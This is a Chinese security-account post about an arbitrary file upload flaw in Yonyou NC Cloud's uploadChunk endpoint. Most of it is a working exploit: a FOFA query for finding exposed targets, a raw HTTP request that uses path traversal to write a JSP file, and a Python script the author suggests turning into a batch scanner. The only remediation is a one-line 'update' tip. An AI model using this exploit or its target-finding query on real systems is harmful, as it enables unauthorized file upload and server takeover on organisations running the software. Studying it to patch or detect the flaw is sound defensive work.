#  安全情报，X友NC存在任意文件上传漏洞！！   
原创 Ax  极星信安   2023-11-28 16:32  
  
**声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，禁止私自转载，如需转载，请联系作者！！！！  
  
请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关！！！！！  
  
**漏洞介绍**  
  
X友NC Cloud大型企业数字化平台，深度应用新一代数字智能技术，基于云原生架构，打造开放、互联、融合、智能的一体化云平  
台，X友NC Cloud uploadChunk存在任意文件上传漏洞，未经授权的攻击者通过漏洞可以上传任  
意文件，获取服务器权限。  
  
**影响版本**  
```
用友NC Cloud uploadChunk
```  
  
**漏洞情报**  
  
**fofa语句**  
```
app="用友NC Cloud uploadChunk"
```  
  
**Poc**  
```
POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip, deflate
**************************************
--bd966ad8118cfcc67ee341272f2900c4
Content-Disposition: form-data; name="file"; filename="ncchr_log.jsp"

<%out.println("12345678");%>
--bd966ad8118cfcc67ee341272f2900c4--
```  
  
**Poc验证工具**  
  
这里给个基础的demo，大佬们自己改成批量就可以了。  
```
import requests

# 输入目标主机和路径
host = "your_host"
path = "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"

# 构建完整的URL
url = f"http://{host}{path}"

# 定义请求头
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Accept-Encoding": "gzip, deflate",
}

# 定义请求体
payload = """
**************************************
--bd966ad8118cfcc67ee341272f2900c4
Content-Disposition: form-data; name="file"; filename="ncchr_log.jsp"

<%out.println("12345678");%>
--bd966ad8118cfcc67ee341272f2900c4--
"""

# 发送 POST 请求
response = requests.post(url, headers=headers, data=payload)

# 检查响应状态码
if response.status_code == 200:
    print("验证成功")
else:
    print("验证失败")

```  
  
**修复建议**  
```
建议及时更新至最新版本！
```  
  
**关注我们**  
  
  
